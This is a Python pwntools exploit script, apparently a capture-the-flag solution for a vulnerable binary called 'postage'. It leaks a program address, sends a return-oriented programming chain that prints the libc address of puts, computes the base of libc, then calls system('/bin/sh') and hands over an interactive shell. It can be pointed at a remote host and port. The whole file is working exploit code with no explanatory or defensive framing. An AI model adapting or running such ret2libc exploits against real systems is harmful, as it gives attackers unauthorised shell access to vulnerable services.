#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./postage_patched')
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    offset = 56
    
    io.recvuntil('\nWelcome to  ')
    leak = int(io.recvline(), 16)
    exe.address = leak - exe.sym['vuln']

    pop_rdi = exe.address + 0x0000000000001356 # pop rdi ; pop rbp ; ret

    payload = flat({
        offset: [
            pop_rdi,
            exe.got['puts'],
            b'A'*8,
            exe.plt['puts'],
            exe.sym['main']+8
        ]
    })
    
    sleep(60)
    io.sendline('pwner')
    io.sendline(payload)

    io.recvuntil('questions?\n')
    leak = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = leak - libc.sym['puts']

    sh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']
    ret = exe.address + 0x000000000000101a # ret

    payload = flat({
        offset: [
            pop_rdi,
            sh,
            b'A'*8,
            system
        ]
    })

    io.sendline('pwner')
    io.sendline(payload)

    io.interactive()


def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()
